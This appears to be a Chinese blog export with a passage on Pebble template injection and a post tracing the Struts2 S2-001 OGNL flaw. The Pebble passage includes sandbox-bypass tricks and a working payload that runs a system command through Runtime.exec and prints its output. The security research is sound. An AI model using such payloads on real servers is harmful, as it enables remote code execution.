class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; someString.toUPPERCASE()   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为正确的表达式是 toupperCase()而不toUPPERCASE()，所以此表达式并不运行。但是，因为Pebble 在设计时忽略了方法或属性名称中大小写问题，所以实际上使用上面的代码，也可以”正常”调用toUpperCase()。</p>\n<p>所以，问题是当 Pebble 试图阻止访问getClass()时，它检查方法的名称时区分大小写。因此，可以只使用以下语句：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123; someString.getCLASS().forName(...)   &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>来绕过保护，拼写不敏感问题已经 2019 年 4 月 发布的3.0.9 版本中修复了。</p>\n<p>几个月后，在研究其他一些与Java相关的内容并浏览文档时，我注意到有另一种内置方法可以访问java.lang.Class。Java 中的几个包装类（例如 java.lang.Integer）中有名为 TYPE 的字段，其Type为 java.lang.Class 自身；因此，执行任意代码的另一种方法如下所示：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;   (<span class=\"number\">1</span>).TYPE.forName(...) &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>我<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">于2019年7月向Pebble</a>报告<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">了该问题</a>，并使用与FreeMarker中相同的方法在master中修复了<a href=\"https://github.com/PebbleTemplates/pebble/issues/454\">该问题</a>相同的方法（即：在主控中修复了该问题方法调用黑名单）。因此，尽管我仍然可以执行，但是forName()方法被禁用，使得执行任意代码变得“不可能”。我将“不可能”一词用引号引起来，因为我认为仍然可以找到旁路绕过，但是我无法做到这一点。不过这将是可以进行研究的有趣空间。</p>\n<h2 id=\"读取命令的输出（Java-9-）\"><a href=\"#读取命令的输出（Java-9-）\" class=\"headerlink\" title=\"读取命令的输出（Java 9+）\"></a>读取命令的输出（Java 9+）</h2><p>尽管在Java中很容易执行任意命令，但是在出现诸如服务器端模板注入之类漏洞的情况下，有时候会难以读取输出。它通常是通过遍历生成的 InputStream 或out-of-band传输层协议使用带外数据(传输层协议使用带外数据 译者注)来发送输出来完成的。</p>\n<p>在研究Pebble时，我注意到在Java 9+中事情变得简单得多，因为现在<code>InputStream</code>有了便捷方法<a href=\"https://docs.oracle.com/javase/9/docs/api/java/io/InputStream.html#readAllBytes--\">readAllBytes</a><code>来读取</code>返回字节数组，然后<code>byte[]</code>可以使用<code>String</code>构造函数转换为<code>String</code>。以下是漏洞利用代码：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;% set cmd = <span class=\"string\">&#x27;id&#x27;</span> %&#125;</span><br><span class=\"line\">&#123;% set bytes = (<span class=\"number\">1</span>).TYPE</span><br><span class=\"line\">     .forName(<span class=\"string\">&#x27;java.lang.Runtime&#x27;</span>)</span><br><span class=\"line\">     .methods[<span class=\"number\">6</span>]</span><br><span class=\"line\">     .invoke(<span class=\"keyword\">null</span>,<span class=\"keyword\">null</span>)</span><br><span class=\"line\">     .exec(cmd)</span><br><span class=\"line\">     .inputStream</span><br><span class=\"line\">     .readAllBytes() %&#125;</span><br><span class=\"line\">&#123;&#123; (<span class=\"number\">1</span>).TYPE</span><br><span class=\"line\">     .forName(<span class=\"string\">&#x27;java.lang.String&#x27;</span>)</span><br><span class=\"line\">     .constructors[<span class=\"number\">0</span>]</span><br><span class=\"line\">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>结果：</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/27/uKCtl6.png\" alt=\"uKCtl6.png\"></p>\n<p>Pebble示例漏洞利用</p>\n<h2 id=\"玩转Pebble\"><a href=\"#玩转Pebble\" class=\"headerlink\" title=\"玩转Pebble\"></a>玩转Pebble</h2><p>如果您想玩转Pebble，我们准备了一个带有Docker容器的GitHub存储库，您可以在其中运行各种版本的Pebble。您可以在这里获取它：<a href=\"https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble\">https</a> : <a href=\"https://github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble\">//github.com/securitum/research/tree/master/r2019_server-side-template-injection-on-the-example-of-pebble</a>。</p>\n<p>确保已经安装了<code>docker</code>和<code>docker-compose</code>，然后运行<code>docker-compose</code>，Web服务器就会在http：// localhost：4567上运行了。</p>\n<p><img src=\"https://s2.ax1x.com/2019/09/27/uKCN6K.png\" alt=\"uKCN6K.png\"></p>\n<p>Docker应用程序的屏幕截图</p>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>与许多的主流模板引擎相比，Pebble并没有本质上的不同；如果允许修改模板，则可以执行任意命令，因此建议确保未经授权的用户永远不能修改模板。</p>"},{"title":"Struts2 S2-001漏洞深入研究","date":"2019-05-26T08:26:35.000Z","cover":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/lAhmeU.md.png","top_img":"https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg","_content":"\nStruts2 S2-001漏洞深入研究\n\n<!--more-->\n\nStruts2工作原理\n---------------\n\nSuruts2的工作原理如下图\n\n![lARuod.png](https://s2.ax1x.com/2019/12/26/lARuod.png)\n\n在该图中，一共给出了四种颜色的标识，其对应的意义如下。\n\n-   Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。\n\n-   Struts Core(浅蓝色)：Struts2的核心部分。\n\n-   Interceptors(浅绿色)：Struts2的拦截器。\n\n-   User created(浅黄色)：需要开发人员创建的部分。\n\n图中的一些组件的作用如下：\n\n-   **FilterDispatcher**：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。\n\n-   **ActionMapper**：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。\n\n-   **ActionProxy**：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。\n\n-   **ConfigurationManager**：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。\n\n-   **struts.xml**：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。\n\n-   **ActionInvocation**：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。\n\n-   **Interceptor**：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。\n\n-   **Action**：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。\n\n-   **Result**：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。\n\n-   **Templates**：各种视图类型的页面模板，比如JSP就是一种模板页面技术。\n\n-   **Tag\n    Subsystem**：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。\n\n一个请求在Struts2框架中的处理大概分为以下几个步骤\n\n1、客户端初始化一个指向Servlet容器（例如Tomcat）的请求\n\n2、这个请求经过一系列的过滤器（Filter）（这些过滤器中有一个叫做ActionContextCleanUp的可选过滤器，这个过滤器对于Struts2和其他框架的集成很有帮助，例如：SiteMesh\nPlugin）\n\n3、接着FilterDispatcher被调用，FilterDispatcher询问ActionMapper来决定这个请是否需要调用某个Action\n\n漏洞分析\n--------\n\n首先写一个很简单的Demo\n\n![lAtluV.png](https://s2.ax1x.com/2019/12/26/lAtluV.png)\n\n![lAtAHS.png](https://s2.ax1x.com/2019/12/26/lAtAHS.png)\n\n![lAtJN4.png](https://s2.ax1x.com/2019/12/26/lAtJN4.png)\n\n![lAt3HU.png](https://s2.ax1x.com/2019/12/26/lAt3HU.png)\n\n我们先从struts2接收我们表单中提交的参数开始分析，代码位于com/opensymphony/xwork2/interceptor/ParametersInterceptor.java\n\n![lAtDHO.png](https://s2.ax1x.com/2019/12/26/lAtDHO.png)\n\n程序获得我们表单中提交的username以及password\n\n在获取表单提交参数后，进行set操作，为类中变量赋值\n\n![lAYzhd.png](https://s2.ax1x.com/2019/12/26/lAYzhd.png)\n\nSet执行完之后，执行execute方法，此时username为%{1+1}，password为123\n\n![lAtp9A.png](https://s2.ax1x.com/2019/12/26/lAtp9A.png)\n\n跳过一部分的中间过程，execute方法最终会调用/org/apache/struts2/views/jsp/ComponentTagSupport.java对jsp标签进行逐一解析以构建返回页面。我们直接从解析传入payload的username标签开始\n\n![lAtKcq.png](https://s2.ax1x.com/2019/12/26/lAtKcq.png)\n\n当解析到”\\<” 标签开始符合时，进入doStartTag方法\n\n![lAR0Wq.png](https://s2.ax1x.com/2019/12/26/lAR0Wq.png)\n\nStruts2自定义标签类重写主要就是重写doStartTag()和doEndTag()方法。\n\ndoStartTag()方法是遇到标签开始时会呼叫的方法，doEndTag()方法是在遇到标签结束时呼叫的方法\n\n当doStartTag()方法执行结束后，程序重新回到index.jsp \\<s:textfield name=\"username\" label=\"username\"/\\>这一行，此时解析到”/\\>”符号，接着进入doEndTag方法\n\n![lARZLD.png](https://s2.ax1x.com/2019/12/26/lARZLD.png)\n\n在doEndTag方法中调用componet.end方法解析\\<s:textfield name=\"username\" label=\"username\" /\\>，我们跟入这个方法\n\n![lAt28A.png](https://s2.ax1x.com/2019/12/26/lAt28A.png)\n\n在end 方法中，可见调用evaluateParams方法，我们继续跟入该方法\n\n![lARNwQ.png](https://s2.ax1x.com/2019/12/26/lARNwQ.png)\n\n在evaluateParams方法中，当this.name 不为null时，进入上图if分支\n\n由于我们解析的为index.jsp中这一\\<s:textfield name=\"username\" label=\"username\"/\\>\n\n此时的this.name值为”username”\n\n在if (this.name != null)这一分支中调用this.findString方法,对传入findString方法中的this.name进行处理，并将返回的值赋值给name变量\n\n由于这个name变量值以及findString方法对后文漏洞都有重要的影响，因此我们跟一下findString方法即name值获取的过程\n\n跟入findString方法，此时传入findString方法的expr参数值为”username”\n\n![lARJOS.png](https://s2.ax1x.com/2019/12/26/lARJOS.png)\n\n在findString方法中，调用translateVariables方法，此时传入translateVariables方法的expr变量值为”username”\n\n跟入translateVariables方法\n\n![lAR8Qf.png](https://s2.ax1x.com/2019/12/26/lAR8Qf.png)\n\n在translateVariables方法中存在一处while循环\n\n![lAtu3n.png](https://s2.ax1x.com/2019/12/26/lAtu3n.png)\n\n在循环中，会判断expression是否以”%{”开头且以”}”结尾\n\n当满足这个条件，程序将认为其是表达式，并进入如下if分支进行表达式计算处理\n\n![lARrlV.png](https://s2.ax1x.com/2019/12/26/lARrlV.png)\n\n但是很显然，我们本次的expression为字符串”username”，并不满足条件，因此没有办法进入上图119行处的if分支，直接返回，见下图\n\n![lAtag1.png](https://s2.ax1x.com/2019/12/26/lAtag1.png)\n\n在return后，程序继续回到evaluateParams方法中，此时if (this.name !=\nnull)已经执行结束，经过上文的分析，findString方法的原理以及name值的得来已经很清楚了。evaluateParams方法中除了if(this.name != null)，还有一连串很多if分支\n\n程序会继续执行后续的if，如下图\n\n![lAtRgI.png](https://s2.ax1x.com/2019/12/26/lAtRgI.png)\n\n![lAtCct.png](https://s2.ax1x.com/2019/12/26/lAtCct.png)\n\n我们跳过中间这一长串if，直接看上图断点处\n\n在altSyntax开启时，进入此分支\n\n![lARndH.png](https://s2.ax1x.com/2019/12/26/lARndH.png)\n\n此时的name为”username”，即从上文if (this.name !=null)分支那个我们上文分析的那个if分支内获取来\n\n上图红框中的Expr变量，是由name拼接”%{}”得来，因此值为”%{“username”}”\n\n紧接着这个expr又在下一行代码中传入findValue，见下图\n\n![lAtgCd.png](https://s2.ax1x.com/2019/12/26/lAtgCd.png)\n\nFindValue方法经过上文if (this.name != null)分支分析，大家一定已经很熟悉\n\nFindValue方法最终会将expr即”%{“username”}”传入translateVariables方法\n\n![lAtBDK.png](https://s2.ax1x.com/2019/12/26/lAtBDK.png)\n\n不同于上文那次，此时的expr可是以“%{“开头并且以”}”结尾，满足进入if ((start != -1) && (end != -1) && (count == 0))分支的条件\n\n![lAt64H.png](https://s2.ax1x.com/2019/12/26/lAt64H.png)\n\nExpr经过下图120的substring取值操作，最后将”%{}”脱掉，将”username”赋值给var\n\n![lAt91I.png](https://s2.ax1x.com/2019/12/26/lAt91I.png)\n\n接着var被传入Stack.findValue，我们跟入Stack.findValue方法\n\nStack.findValue如下图\n\n![lAtn9s.png](https://s2.ax1x.com/2019/12/26/lAtn9s.png)\n\nstack.findValue对Ognl表达式进行getValue处理，在经过stack.findValue操作后将表单中username的值进行返回\n\n程序找到我们提交的表单中username的值为”%{1+1}”，见下图\n\n![lAt0u6.png](https://s2.ax1x.com/2019/12/26/lAt0u6.png)\n\n上图这个值就是我们构造的payload\n\nO为stack.findValue的返回值，因此o为”%{1+1}”，见下图\n\n![lAtZNQ.png](https://s2.ax1x.com/2019/12/26/lAtZNQ.png)\n\n接着o在字符拼接处理后，赋值给expression变量，见下图\n\n![lAtVAg.png](https://s2.ax1x.com/2019/12/26/lAtVAg.png)\n\n由上图可见， expression 被拼接成 “%{1+1}”\n\n注意，这时候我们还在while循环中，while循环仍没有结束\n\n在这一次的循环中expression 为 “%{1+1}”，见下图\n\n![lARdFs.png](https://s2.ax1x.com/2019/12/26/lARdFs.png)\n\nexpression 为 “%{1+1}”\n\n与上文流程一致，此时 “1+1”被取出赋值给var，见下图\n\n![lAtMj0.png](https://s2.ax1x.com/2019/12/26/lAtMj0.png)\n\nVar被传递给stack.findValue，findValue中对”1+1”表达式进行getValue操作，见下图\n\n![lARQJI.png](https://s2.ax1x.com/2019/12/26/lARQJI.png)\n\nstack.findValue将处理后的结果2赋值给o，见下图\n\n![lAtdjx.png](https://s2.ax1x.com/2019/12/26/lAtdjx.png)\n\nexpression由o拼接而来，拼接后的expression 为 2，见下图\n\n![lAtkB8.png](https://s2.ax1x.com/2019/12/26/lAtkB8.png)\n\n我们仍然在while循环中，在这一次的循环中expression 为 2，见下图\n\n![lAt1BT.png](https://s2.ax1x.com/2019/12/26/lAt1BT.png)\n\n此时expression已经不能满足”%{}”的格式，自然也不会进入后续if分支继续计算\n\n![lAtFnf.png](https://s2.ax1x.com/2019/12/26/lAtFnf.png)\n\n因此break跳出while循环，将值进行return\n\n![lAtsED.png](https://s2.ax1x.com/2019/12/26/lAtsED.png)\n\n此时return的username值为计算后的2\n\n其实在弄清程序处理的步骤后，不难发现，其实struts2是这样执行的\n\n1.  struts2获得要处理的表单字段名，这里对应的是”username”\n\n2.  将字段名拼接成”%{}”形式，即”%{“username”}”\n\n3.  进入while循环，在while循环中，只要满足”%{}”形式，就将其中值取出进行Ognl\n    getValue操作，这里对应的就是取出username的value值，即我们构造的payload”%{1+1}”。\n    这个操作可以理解为用来取出表单字段对应的value操作\n\n4.  由于取出的username值”%{1+1}”仍满足”%{}”形式，1+1即被取出传入进行Ongl\n    getValue操作，1+1最后返回值为2\n\n5.  由于2不满足”%{}”形式，while循环停止，将2进行返回\n\n6.  程序构造返回页面，进行返回\n\n一些想法\n--------\n\nS2-001的官方描述如下\n\nWebWork 2.1+和Struts 2的“\naltSyntax”功能允许将OGNL表达式插入文本字符串并进行递归处理。这允许恶意用户通常通过HTML文本字段提交包含OGNL表达式的字符串，如果表单验证失败，该字符串将由服务器执行。\n\n但是只有表单验证失败才会触发漏洞吗？\n\n接下来我们做个实验验证\n\n首先修改了下后台代码\n\n![lAtehj.png](https://s2.ax1x.com/2019/12/26/lAtehj.png)\n\n结果表明Success与否，都返回index.jsp\n\n![lAYxtH.png](https://s2.ax1x.com/2019/12/26/lAYxtH.png)\n\n![lAtGEF.png](https://s2.ax1x.com/2019/12/26/lAtGEF.png)\n\n表达式仍然可以执行，可见与success无关","source":"_posts/s2001.md","raw":"---\ntitle: Struts2 S2-001漏洞深入研究\ndate: 2019-5-26 16:26:35\ntags: [web漏洞分析 ,java]\ncategories: 技术\ncover: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/lAhmeU.md.png\ntop_img: https://gingsguard.oss-cn-beijing.aliyuncs.com/blog/php.jpg\n---\n\nStruts2 S2-001漏洞深入研究\n\n<!--more-->\n\nStruts2工作原理\n---------------\n\nSuruts2的工作原理如下图\n\n![lARuod.png](https://s2.ax1x.com/2019/12/26/lARuod.png)\n\n在该图中，一共给出了四种颜色的标识，其对应的意义如下。\n\n-   Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。\n\n-   Struts Core(浅蓝色)：Struts2的核心部分。\n\n-   Interceptors(浅绿色)：Struts2的拦截器。\n\n-   User created(浅黄色)：需要开发人员创建的部分。\n\n图中的一些组件的作用如下：\n\n-   **FilterDispatcher**：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。\n\n-   **ActionMapper**：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。\n\n-   **ActionProxy**：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。\n\n-   **ConfigurationManager**：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。\n\n-   **struts.xml**：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。\n\n-   **ActionInvocation**：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。\n\n-   **Interceptor**：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。\n\n-   **Action**：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。\n\n-   **Result**：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。\n\n-   **Templates**：各种视图类型的页面模板，比如JSP就是一种模板页面技术。\n\n-   **Tag\n    Subsystem**：Struts2的标签库，它抽象了三种不同的视图技术JSP、velocity、freemarker，可以在不同的视图技术中，几乎没有差别的使用这些标签。\n\n一个请求在Struts2框架中的处理大概分为以下几个步骤\n\n1、客户端初始化一个指向Servlet容器（例如Tomcat）的请求\n\n2、这个请求经过一系列的过滤器（Filter）（这些过滤器中有一个叫做ActionContextCleanUp的可选过滤器，这个过滤器对于Struts2和其他框架的集成很有帮助，例如：SiteMesh\nPlugin）\n\n3、接着FilterDispatcher被调用，FilterDispatcher询问ActionMapper来决定这个请是否需要调用某个Action\n\n漏洞分析\n--------\n\n首先写一个很简单的Demo\n\n![lAtluV.png](https://s2.ax1x.com/2019/12/26/lAtluV.png)\n\n![lAtAHS.png](https://s2.ax1x.com/2019/12/26/lAtAHS.png)\n\n![lAtJN4.png](https://s2.ax1x.com/2019/12/26/lAtJN4.png)\n\n![lAt3HU.png](https://s2.ax1x.com/2019/12/26/lAt3HU.png)\n\n我们先从struts2接收我们表单中提交的参数开始分析，代码位于com/opensymphony/xwork2/interceptor/ParametersInterceptor.java\n\n![lAtDHO.png](https://s2.ax1x.com/2019/12/26/lAtDHO.png)\n\n程序获得我们表单中提交的username以及password\n\n在获取表单提交参数后，进行set操作，为类中变量赋值\n\n![lAYzhd.png](https://s2.ax1x.com/2019/12/26/lAYzhd.png)\n\nSet执行完之后，执行execute方法，此时username为%{1+1}，password为123\n\n![lAtp9A.png](https://s2.ax1x.com/2019/12/26/lAtp9A.png)\n\n跳过一部分的中间过程，execute方法最终会调用/org/apache/struts2/views/jsp/ComponentTagSupport.java对jsp标签进行逐一解析以构建返回页面。我们直接从解析传入payload的username标签开始\n\n![lAtKcq.png](https://s2.ax1x.com/2019/12/26/lAtKcq.png)\n\n当解析到”\\<” 标签开始符合时，进入doStartTag方法\n\n![lAR0Wq.png](https://s2.ax1x.com/2019/12/26/lAR0Wq.png)\n\nStruts2自定义标签类重写主要就是重写doStartTag()和doEndTag()方法。\n\ndoStartTag()方法是遇到标签开始时会呼叫的方法，doEndTag()方法是在遇到标签结束时呼叫的方法\n\n当doStartTag()方法执行结束后，程序重新回到index.jsp \\<s:textfield name=\"username\" label=\"username\"/\\>这一行，此时解析到”/\\>”符号，接着进入doEndTag方法\n\n![lARZLD.png](https://s2.ax1x.com/2019/12/26/lARZLD.png)\n\n在doEndTag方法中调用componet.end方法解析\\<s:textfield name=\"username\" label=\"username\" /\\>，我们跟入这个方法\n\n![lAt28A.png](https://s2.ax1x.com/2019/12/26/lAt28A.png)\n\n在end 方法中，可见调用evaluateParams方法，我们继续跟入该方法\n\n![lARNwQ.png](https://s2.ax1x.com/2019/12/26/lARNwQ.png)\n\n在evaluateParams方法中，当this.name 不为null时，进入上图if分支\n\n由于我们解析的为index.jsp中这一\\<s:textfield name=\"username\" label=\"username\"/\\>\n\n此时的this.name值为”username”\n\n在if (this.name != null)这一分支中调用this.findString方法,对传入findString方法中的this.name进行处理，并将返回的值赋值给name变量\n\n由于这个name变量值以及findString方法对后文漏洞都有重要的影响，因此我们跟一下findString方法即name值获取的过程\n\n跟入findString方法，此时传入findString方法的expr参数值为”username”\n\n![lARJOS.png](https://s2.ax1x.com/2019/12/26/lARJOS.png)\n\n在findString方法中，调用translateVariables方法，此时传入translateVariables方法的expr变量值为”username”\n\n跟入translateVariables方法\n\n![lAR8Qf.png](https://s2.ax1x.com/2019/12/26/lAR8Qf.png)\n\n在translateVariables方法中存在一处while循环\n\n![lAtu3n.png](https://s2.ax1x.com/2019/12/26/lAtu3n.png)\n\n在循环中，会判断expression是否以”%{”开头且以”}”结尾\n\n当满足这个条件，程序将认为其是表达式，并进入如下if分支进行表达式计算处理\n\n![lARrlV.png](https://s2.ax1x.com/2019/12/26/lARrlV.png)\n\n但是很显然，我们本次的expression为字符串”username”，并不满足条件，因此没有办法进入上图119行处的if分支，直接返回，见下图\n\n![lAtag1.png](https://s2.ax1x.com/2019/12/26/lAtag1.png)\n\n在return后，程序继续回到evaluateParams方法中，此时if (this.name !=\nnull)已经执行结束，经过上文的分析，findString方法的原理以及name值的得来已经很清楚了。evaluateParams方法中除了if(this.name != null)，还有一连串很多if分支\n\n程序会继续执行后续的if，如下图\n\n![lAtRgI.png](https://s2.ax1x.com/2019/12/26/lAtRgI.png)\n\n![lAtCct.png](https://s2.ax1x.com/2019/12/26/lAtCct.png)\n\n我们跳过中间这一长串if，直接看上图断点处\n\n在altSyntax开启时，进入此分支\n\n![lARndH.png](https://s2.ax1x.com/2019/12/26/lARndH.png)\n\n此时的name为”username”，即从上文if (this.name !=null)分支那个我们上文分析的那个if分支内获取来\n\n上图红框中的Expr变量，是由name拼接”%{}”得来，因此值为”%{“username”}”\n\n紧接着这个expr又在下一行代码中传入findValue，见下图\n\n![lAtgCd.png](https://s2.ax1x.com/2019/12/26/lAtgCd.png)\n\nFindValue方法经过上文if (this.name != null)分支分析，大家一定已经很熟悉\n\nFindValue方法最终会将expr即”%{“username”}”传入translateVariables方法\n\n![lAtBDK.png](https://s2.ax1x.com/2019/12/26/lAtBDK.png)\n\n不同于上文那次，此时的expr可是以“%{“开头并且以”}”结尾，满足进入if ((start != -1) && (end != -1) && (count == 0))分支的条件\n\n![lAt64H.png](https://s2.ax1x.com/2019/12/26/lAt64H.png)\n\nExpr经过下图120的substring取值操作，最后将”%{}”脱掉，将”username”赋值给var\n\n![lAt91I.png](https://s2.ax1x.com/2019/12/26/lAt91I.png)\n\n接着var被传入Stack.findValue，我们跟入Stack.findValue方法\n\nStack.findValue如下图\n\n![lAtn9s.png](https://s2.ax1x.com/2019/12/26/lAtn9s.png)\n\nstack.findValue对Ognl表达式进行getValue处理，在经过stack.findValue操作后将表单中username的值进行返回\n\n程序找到我们提交的表单中username的值为”%{1+1}”，见下图\n\n![lAt0u6.png](https://s2.ax1x.com/2019/12/26/lAt0u6.png)\n\n上图这个值就是我们构造的payload\n\nO为stack.findValue的返回值，因此o为”%{1+1}”，见下图\n\n![lAtZNQ.png](https://s2.ax1x.com/2019/12/26/lAtZNQ.png)\n\n接着o在字符拼接处理后，赋值给expression变量，见下图\n\n![lAtVAg.png](https://s2.ax1x.com/2019/12/26/lAtVAg.png)\n\n由上图可见， expression 被拼接成 “%{1+1}”\n\n注意，这时候我们还在while循环中，while循环仍没有结束\n\n在这一次的循环中expression 为 “%{1+1}”，见下图\n\n![lARdFs.png](https://s2.ax1x.com/2019/12/26/lARdFs.png)\n\nexpression 为 “%{1+1}”\n\n与上文流程一致，此时 “1+1”被取出赋值给var，见下图\n\n![lAtMj0.png](https://s2.ax1x.com/2019/12/26/lAtMj0.png)\n\nVar被传递给stack.findValue，findValue中对”1+1”表达式进行getValue操作，见下图\n\n![lARQJI.png](https://s2.ax1x.com/2019/12/26/lARQJI.png)\n\nstack.findValue将处理后的结果2赋值给o，见下图\n\n![lAtdjx.png](https://s2.ax1x.com/2019/12/26/lAtdjx.png)\n\nexpression由o拼接而来，拼接后的expression 为 2，见下图\n\n![lAtkB8.png](https://s2.ax1x.com/2019/12/26/lAtkB8.png)\n\n我们仍然在while循环中，在这一次的循环中expression 为 2，见下图\n\n![lAt1BT.png](https://s2.ax1x.com/2019/12/26/lAt1BT.png)\n\n此时expression已经不能满足”%{}”的格式，自然也不会进入后续if分支继续计算\n\n![lAtFnf.png](https://s2.ax1x.com/2019/12/26/lAtFnf.png)\n\n因此break跳出while循环，将值进行return\n\n![lAtsED.png](https://s2.ax1x.com/2019/12/26/lAtsED.png)\n\n此时return的username值为计算后的2\n\n其实在弄清程序处理的步骤后，不难发现，其实struts2是这样执行的\n\n1.  struts2获得要处理的表单字段名，这里对应的是”username”\n\n2.  将字段名拼接成”%{}”形式，即”%{“username”}”\n\n3.  进入while循环，在while循环中，只要满足”%{}”形式，就将其中值取出进行Ognl\n    getValue操作，这里对应的就是取出username的value值，即我们构造的payload”%{1+1}”。\n    这个操作可以理解为用来取出表单字段对应的value操作\n\n4.  由于取出的username值”%{1+1}”仍满足”%{}”形式，1+1即被取出传入进行Ongl\n    getValue操作，1+1最后返回值为2\n\n5.  由于2不满足”%{}”形式，while循环停止，将2进行返回\n\n6.  程序构造返回页面，进行返回\n\n一些想法\n--------\n\nS2-001的官方描述如下\n\nWebWork 2.1+和Struts 2的“\naltSyntax”功能允许将OGNL表达式插入文本字符串并进行递归处理。这允许恶意用户通常通过HTML文本字段提交包含OGNL表达式的字符串，如果表单验证失败，该字符串将由服务器执行。\n\n但是只有表单验证失败才会触发漏洞吗？\n\n接下来我们做个实验验证\n\n首先修改了下后台代码\n\n![lAtehj.png](https://s2.ax1x.com/2019/12/26/lAtehj.png)\n\n结果表明Success与否，都返回index.jsp\n\n![lAYxtH.png](https://s2.ax1x.com/2019/12/26/lAYxtH.png)\n\n![lAtGEF.png](https://s2.ax1x.com/2019/12/26/lAtGEF.png)\n\n表达式仍然可以执行，可见与success无关","slug":"s2001","published":1,"updated":"2020-10-27T09:25:29.779Z","_id":"ckgrozu9x004kwsa942sd28jk","comments":1,"layout":"post","photos":[],"link":"","content":"<p>Struts2 S2-001漏洞深入研究</p>\n<a id=\"more\"></a>\n\n<h2 id=\"Struts2工作原理\"><a href=\"#Struts2工作原理\" class=\"headerlink\" title=\"Struts2工作原理\"></a>Struts2工作原理</h2><p>Suruts2的工作原理如下图</p>\n<p><img src= \"/img/loading.gif\" data-lazy-src=\"https://s2.ax1x.com/2019/12/26/lARuod.png\" alt=\"lARuod.png\"></p>\n<p>在该图中，一共给出了四种颜色的标识，其对应的意义如下。</p>\n<ul>\n<li><p>Servlet Filters(橙色)：过滤器，所有的请求都要经过过滤器的处理。</p>\n</li>\n<li><p>Struts Core(浅蓝色)：Struts2的核心部分。</p>\n</li>\n<li><p>Interceptors(浅绿色)：Struts2的拦截器。</p>\n</li>\n<li><p>User created(浅黄色)：需要开发人员创建的部分。</p>\n</li>\n</ul>\n<p>图中的一些组件的作用如下：</p>\n<ul>\n<li><p><strong>FilterDispatcher</strong>：是整个Struts2的调度中心，也就是整个MVC架构中的C，它根据ActionMapper的结果来决定是否处理请求。</p>\n</li>\n<li><p><strong>ActionMapper</strong>：用来判断传入的请求是否被Struts2处理，如果需要处理的话，ActionMapper就会返回一个对象来描述请求对应的ActionInvocation的信息。</p>\n</li>\n<li><p><strong>ActionProxy</strong>：用来创建一个ActionInvocation代理实例，它位于Action和xwork之间。</p>\n</li>\n<li><p><strong>ConfigurationManager</strong>：是xwork配置的管理中心，可以把它当做已经读取到内存中的struts.xml配置文件。</p>\n</li>\n<li><p><strong>struts.xml</strong>：是Stuts2的应用配置文件，负责诸如URL与Action之间映射的配置、以及执行后页面跳转的Result配置等。</p>\n</li>\n<li><p><strong>ActionInvocation</strong>：用来真正的调用并执行Action、拦截器和对应的Result，作用类似于一个调度器。</p>\n</li>\n<li><p><strong>Interceptor</strong>：拦截器，可以自动拦截Action，主要在Action运行之前或者Result运行之后来进行执行，开发者可以自定义。</p>\n</li>\n<li><p><strong>Action</strong>：是Struts2中的动作执行单元。用来处理用户请求，并封装业务所需要的数据。</p>\n</li>\n<li><p><strong>Result</strong>：是不同视图类型的抽象封装模型，不同的视图类型会对应不同的Result实现，Struts2中支持多种视图类型，比如Jsp，FreeMarker等。</p>\n</li>\n<li><p><strong>Templates</strong>：各种视图类型的页面模板，比如JSP就是一种模板页面技术。</p>